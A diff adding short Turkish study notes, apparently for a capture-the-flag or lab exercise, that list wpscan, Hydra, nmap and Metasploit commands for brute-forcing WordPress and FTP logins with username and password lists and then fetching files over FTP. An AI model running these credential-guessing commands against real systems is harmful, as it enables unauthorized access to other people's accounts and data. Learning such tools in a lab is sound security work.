@@ -1,0 +1,20 @@
+Wordpress tabanlı web arayüzde kullanılabilir.
+wpscan --url https://x.com & 10.10.x.x
+wpscan --url https://x.com --usernames a.txt --password p.txt
+
+Hydra
+hydra -l molly -p kelly 10.10.10.10 ftp
+hydra -L users.txt -P pass.txt 10.10.10.10 ftp
+& ftp://10.10.10.10
+get abc.txt
+-----
+Remote Login denir ise SSH ve Telnet tarayabilirsin
+FTP Crack nmap -p 21 10.10.x.x
+hydra -L user.txt -P pass.txt 10.10.x.x FTP
+ftp IP
+get file
+cat file
+-----
+Metasploit
+msfconsole ile başlatılır.
+SET ile ayarlanır, Run ile başlatılır.
